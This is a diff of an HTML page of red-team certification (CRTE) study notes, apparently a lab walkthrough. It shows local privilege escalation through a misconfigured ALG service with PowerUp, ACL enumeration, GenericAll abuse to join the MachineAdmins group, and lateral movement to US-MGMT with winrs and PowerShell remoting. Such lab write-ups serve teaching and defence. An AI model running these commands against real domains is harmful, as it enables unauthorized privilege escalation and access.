@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRTE - Certified Red Team Expert - CRTE Study Notes</title>
+    <title>CRTE - Certified Red Team Expert</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
@@ -38,15 +38,17 @@
 <li>This may involve abusing trust keys, injecting SID history, or exploiting PAM trusts.</li>
 <li>The default settings for trusts can sometimes be abused to move in the reverse direction of the trust.</li>
 <li>**Detection and Defense**: Understanding how attacks are detected and what defenses are in place is crucial for both attackers and defenders. This includes being aware of tools like MDI and MDE, as well as defensive measures like credential guard and WDAC.</li>
-<li>**Adversary Mindset:** Attackers have a tendency to go for the lowest hanging fruit and they often operate under the idea of elusive superiority. Defenders can use this mindset to create deception layers.</li>
-</ul>
+<li>
+<div class="li-header">**Adversary Mindset:** Attackers have a tendency to go for the lowest hanging fruit and they often operate under the idea of elusive superiority. Defenders can use this mindset to create deception layers.</div>
 <p>These aspects highlight the complexity and multi-faceted nature of privilege escalation in AD. It is an ongoing challenge that requires constant vigilance and adaptation from both attackers and defenders..</p>
 <p>Let now use for example PowerUp to accomplish our first task. We will use PowerUp now to check for any privilege escalation path.</p>
+</li>
+</ul>
 <p>Let’s start by loading PowerUp.ps1 the we can execute it.</p>
 <p>`. .\PowerUp.ps1</p>
 <p>Invoke-AllChecks`</p>
-<img src="./images/screenshot_89.png" alt="image" class="content-image">
-<img src="./images/screenshot_90.png" alt="image" class="content-image">
+<img src="./images/screenshot_39.png" alt="image" class="content-image">
+<img src="./images/screenshot_40.png" alt="image" class="content-image">
 <p>As you are able to see on the screenshot above, PowerUp was able to enumerate and find some valid privilege escalation via `Service Permission`on a service named “`ALG`”.</p>
 <h3>**Understanding Service Permissions**</h3>
 <p>Windows services run with different privilege levels (e.g., LocalSystem, LocalService, or NetworkService). If a service is misconfigured, a low-privileged user can exploit it to execute code with higher privileges.</p>
@@ -59,16 +61,10 @@
 <li>**Abuse Function**: `Invoke-ServiceAbuse -Name 'ALG'`.</li>
 </ul>
 <h3>**Privilege Escalation via Service Abuse**</h3>
-<ol>
-<li>**Why This Is a Vulnerability**:</li>
-</ol>
 <ul>
 <li>If a low-privileged user has **write access** to the service configuration or its executable file, they can modify it to execute arbitrary code with `LocalSystem` privileges.</li>
 <li>Misconfigurations in service permissions (e.g., weak permissions on the executable or registry entries) can allow unauthorized users to abuse this service.</li>
 </ul>
-<ol>
-<li>**Exploit Path**:</li>
-</ol>
 <ul>
 <li>**Step 1**: Confirm the user has permission to modify the service or its binary.</li>
 <li>For example, the executable (`alg.exe`) or service parameters might be writable.</li>
@@ -84,39 +80,41 @@
 <li>Restarts the service to execute the attacker's payload.</li>
 </ul>
 <h3>**Why "CanRestart: True" Is Critical**</h3>
+<h3>**Notes**</h3>
 <ul>
-<li>For service abuse to succeed, the attacker must restart the service after modifying it. If the service cannot be restarted, the attack is less effective because the changes won't take effect immediately.</li>
-</ul>
+<li>
+<div class="li-header">For service abuse to succeed, the attacker must restart the service after modifying it. If the service cannot be restarted, the attack is less effective because the changes won't take effect immediately.</div>
 <p>This scenario demonstrates how misconfigured services can be exploited for privilege escalation and emphasizes the importance of securing service configurations in Windows environments.</p>
 <p>Now that we know that we can abuse this Service Permission misconfiguration. Let’s use the abuse function for the service permission issue and add our current domain user (`studentuser163`) to the local Administrators group.</p>
 <p>`Invoke-ServiceAbuse -Name 'ALG' -UserName 'us.techcorp.local\studentuser163' -Verbose`</p>
-<img src="./images/screenshot_91.png" alt="image" class="content-image">
+<img src="./images/screenshot_41.png" alt="image" class="content-image">
 <p>We can see above that, we were able to create a user locally and also add the same user to local `Administrators` group.</p>
-<h3>**Notes**</h3>
-<ul>
+</li>
 <li>`Make sure that you add the user with the domain, this way instead of creating a new user, we will be adding our domain account studentuser163, into local administrators group.`</li>
-<li>`After adding the user to the administrators group, you may need to log out and log back in for the elevated privileges to take effect in the session.`</li>
-</ul>
+<li>
+<div class="li-header">`After adding the user to the administrators group, you may need to log out and log back in for the elevated privileges to take effect in the session.`</div>
 <p>**Before logout and login**</p>
-<img src="./images/screenshot_92.png" alt="image" class="content-image">
+<img src="./images/screenshot_42.png" alt="image" class="content-image">
 <p>**After Logout and Login**</p>
-<img src="./images/screenshot_93.png" alt="image" class="content-image">
+<img src="./images/screenshot_43.png" alt="image" class="content-image">
 <p>We can confirm now that we are part of local administrators group on this machine.</p>
+</li>
+</ul>
 <h2>Remote Local Admin Enumeration</h2>
 <p>Our next task is to enumerate and find a machine in the domain where our user (`studentuser163`) has local administrative access and for this we will use tools like `Find-LocalAdminAccess`(PowerView) `Find-PSRemotingLocalAdminAccess.ps1` and `Find-WMILocalAdminAccess.ps1`.</p>
 <p>Let’s start by invoking all of them at once.</p>
 <p>`. \.PowerView.ps1`</p>
 <p>`. \Find-PSRemotingLocalAdminAccess.ps1`</p>
 <p>`. .\``Find-WMILocalAdminAccess.ps1`</p>
-<img src="./images/screenshot_94.png" alt="image" class="content-image">
+<img src="./images/screenshot_44.png" alt="image" class="content-image">
 <p>Now that we have imported all these 3 modules, we can simply start checking for local administrative access on the machines in the `us.techcorp.local` domain.</p>
 <p>`Find-LocalAdminAccess -Verbose`</p>
-<img src="./images/screenshot_95.png" alt="image" class="content-image">
+<img src="./images/screenshot_45.png" alt="image" class="content-image">
 <p>`Find-PSRemotingLocalAdminAccess -Verbose`</p>
-<img src="./images/screenshot_96.png" alt="image" class="content-image">
+<img src="./images/screenshot_46.png" alt="image" class="content-image">
 <p>`Find-PSRemotingLocalAdminAccess` command will always bring this error on output, but if there was a valid machine on the domain where our user were able to access the machine as local admin, it would bring the name of the machine on the output.</p>
 <p>`Find-WMILocalAdminAccess`</p>
-<img src="./images/screenshot_97.png" alt="image" class="content-image">
+<img src="./images/screenshot_47.png" alt="image" class="content-image">
 <p>We tried 3 tools to for this type of enumeration but we were not able to find a single machine were out `studentuser163` has local admin access.</p>
 <p>So, for our next approach, let enumerate all the groups memberships for our `studentuser163`.</p>
 <h3>Enumerate Group Memberships with ADModule</h3>
@@ -124,11 +122,13 @@
 <h3>**What Does It Mean?**</h3>
 <ul>
 <li>**Direct Membership**: `Get-ADPrincipalGroupMembership` will only show the groups that the specified principal is explicitly a member of.</li>
-<li>**Nested Membership**: If the principal is a member of Group A, and Group A is a member of Group B, `Get-ADPrincipalGroupMembership` will only show Group A. It will not show Group B unless queried separately.</li>
-</ul>
+<li>
+<div class="li-header">**Nested Membership**: If the principal is a member of Group A, and Group A is a member of Group B, `Get-ADPrincipalGroupMembership` will only show Group A. It will not show Group B unless queried separately.</div>
 <p>In scenarios where you need to determine **all effective memberships**, including those through nested groups, this limitation can hinder comprehensive enumeration.</p>
 <p>To bypass this lack of recursive group membership on ADModule, we can use the following script.</p>
-<pre class="code-block"><code class="language-powershell">function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
+</li>
+</ul>
+<pre><code class="language-powershell">  function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
 {
    $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName |
 select -ExpandProperty distinguishedname)
@@ -143,7 +143,7 @@ select -ExpandProperty distinguishedname)
 }</code></pre>
 <p>We can simply copy/paste the script above and then execute the `Get-ADPrincipalGroupMembershipRecursive`.</p>
 <p>`Get-ADPrincipalGroupMembershipRecursive 'studentuser163'`</p>
-<img src="./images/screenshot_98.png" alt="image" class="content-image">
+<img src="./images/screenshot_48.png" alt="image" class="content-image">
 <p>After we copy/paste the script and execute the `Get-ADPrincipalGroupMembershipRecursive`** **command, we can now see recursively all the Groups our user studentuser163 is member of.</p>
 <p>After this our next step is to check if any of the groups we are member of has some interesting ACL entries.</p>
 <h3>Enumerate Group Memberships with PowerView</h3>
@@ -151,7 +151,7 @@ select -ExpandProperty distinguishedname)
 <p>We can use the command `Find-InterestingDomainAcl -ResolveGUIDs` to enumerate all the ACLs. But since we already know all ACLs inside this domain, our main focus so far is to enumerate ACLs form one specific group (Managers).</p>
 <p>So we can achieve this with the following query:</p>
 <p>`Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'Managers'}`</p>
-<pre class="code-block"><code class="language-powershell">ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
+<pre><code class="language-powershell">ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
 AceQualifier            : AccessAllowed
 ActiveDirectoryRights   : ReadProperty, WriteProperty
 ObjectAceType           : Self-Membership
@@ -325,26 +325,30 @@ IdentityReferenceClass  : group</code></pre>
 <li>**IdentityReferenceName**: `managers` → The group that has been granted the permissions.</li>
 <li>**IdentityReferenceDomain**: `us.techcorp.local` → The domain where the `managers` group resides.</li>
 <li>**IdentityReferenceDN**: `CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local` → The Distinguished Name of the `managers` group.</li>
-<li>**IdentityReferenceClass**: `group` → Specifies that the permissions are assigned to a group.</li>
-</ul>
+<li>
+<div class="li-header">**IdentityReferenceClass**: `group` → Specifies that the permissions are assigned to a group.</div>
 <p>The `managers` group in the `us.techcorp.local` domain has been granted **full control** (`GenericAll`) over the `MachineAdmins` group located in the `Mgmt` Organizational Unit.</p>
+</li>
+</ul>
 <p>This means the `managers` group can **read, write, delete, and manage all attributes** of the `MachineAdmins` group.</p>
 <p>The permissions are:</p>
 <ul>
 <li>**Explicitly allowed** (`AccessAllowed`) and apply to **all attributes** (`ObjectAceType: All`) of the object.</li>
-<li>**Inherited** (`Inherited`) from a parent object and propagate to **child objects** (`ContainerInherit`).</li>
-</ul>
+<li>
+<div class="li-header">**Inherited** (`Inherited`) from a parent object and propagate to **child objects** (`ContainerInherit`).</div>
 <p>With **GenericAll** permissions, the `managers` group has full administrative control over `MachineAdmins`, allowing them to:</p>
-<ul>
+</li>
 <li>Add or remove users from the `MachineAdmins` group.</li>
 <li>Modify group attributes.</li>
-<li>Potentially escalate privileges or abuse group memberships for further exploitation.</li>
-</ul>
+<li>
+<div class="li-header">Potentially escalate privileges or abuse group memberships for further exploitation.</div>
 <p>This configuration could represent a **privilege escalation risk** if the `managers` group is compromised, as it allows complete control over the `MachineAdmins` group.</p>
 <p>We can now quickly enumerate ACEs from `MachineAdmins` group using `Get-DomainsObjectACL` from PowerView.</p>
 <p>This command enumerates **ACLs for a specific object**, in this case, the `machineadmins` group, and filters for entries where the `managers` group has permissions.</p>
 <p>`Get-DomainObjectAcl -Identity 'machineadmins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}`</p>
-<pre class="code-block"><code class="language-powershell">AceQualifier           : AccessAllowed
+</li>
+</ul>
+<pre><code class="language-powershell">  AceQualifier           : AccessAllowed
 ObjectDN               : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
 ActiveDirectoryRights  : ReadProperty, WriteProperty
 ObjectAceType          : Self-Membership
@@ -445,33 +449,33 @@ OpaqueLength           : 0
 IdentityName           : US\managers</code></pre>
 <p>To quickly summarize, our `studentuser163` through group membership of `Managers` group has `GenericAll` rights on `machineadmins` group.</p>
 <p>We can also check the ‘`MachineAdmins`’  Description the following message: `Group to manage machines of the Mgmt OU`.</p>
-<img src="./images/screenshot_99.png" alt="image" class="content-image">
+<img src="./images/screenshot_49.png" alt="image" class="content-image">
 <p>So basically this group is managing all the Administrator machines inside `Mgmt` Organization Unit.</p>
 <p>Ok so let’s move on.</p>
 <h3>GenericAll Abuse Over Group with ADModule</h3>
 <p>Since we are member of group manager, and group manager has `GenericAll` over `MachineAdmins` from `Mgtm` OU, we can simply add our user `studentuser163` into `MachineAdmins` group. To accomplish this task we can simply use the following command from ADModule.</p>
 <p>`Add-ADGroupMember -Identity 'MachineAdmins' -Members 'studentuser163' -Verbose`</p>
-<img src="./images/screenshot_100.png" alt="image" class="content-image">
+<img src="./images/screenshot_50.png" alt="image" class="content-image">
 <p>We can see above that we were able to add our user studentuser163 inside `MachineAdmins` group.</p>
 <p>Let’s enumerate this group and confirm that we are now member of `MachineAdmins` group.</p>
 <p>`Get-ADGroupMember -Identity 'MachineAdmins'`</p>
-<img src="./images/screenshot_101.png" alt="image" class="content-image">
+<img src="./images/screenshot_51.png" alt="image" class="content-image">
 <p>Now that we are part of `MachineAdmins`, remember previously when we were enumerating OUs we had a machine named US-MGTM inside MGTM OU.</p>
 <p>We can also enumerate it again with the following command:</p>
 <p>`Get-ADOrganizationalUnit -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name`</p>
-<img src="./images/screenshot_102.png" alt="image" class="content-image">
+<img src="./images/screenshot_52.png" alt="image" class="content-image">
 <p>The machine `US-MGMT` is part of OU `MGMT` and we are part of `MachineAdmins` which is a group inside `MGMT` OU. We should have access to this machine with `studentuser163`.</p>
 <p>Note that we need to clear our existing TGT so that the new group membership isassigned in the new TGT.  So, a logoff and logon may be required.</p>
 <p>After logoff/login again we can see that we are now part of `US\machineadmins` group and we can use winrs for accessing machine us-mgmt.</p>
-<img src="./images/screenshot_103.png" alt="image" class="content-image">
+<img src="./images/screenshot_53.png" alt="image" class="content-image">
 <h3>Remote accessing US-MGMT with WinRS</h3>
 <p>`winrs -r:us-mgmt cmd`</p>
-<img src="./images/screenshot_104.png" alt="image" class="content-image">
+<img src="./images/screenshot_54.png" alt="image" class="content-image">
 <p>As we can see above, we were able to access the `US-MGMT` machine with user `studentuser163`.</p>
 <h3>Remote accessing US-MGMT  PowerShell Remoting</h3>
 <p>`$usmgmt = New-PSSession us-mgmt`</p>
 <p>`Enter-PSSession $usmgmt`</p>
-<img src="./images/screenshot_105.png" alt="image" class="content-image">
+<img src="./images/screenshot_55.png" alt="image" class="content-image">
         </main>
     </div>
     
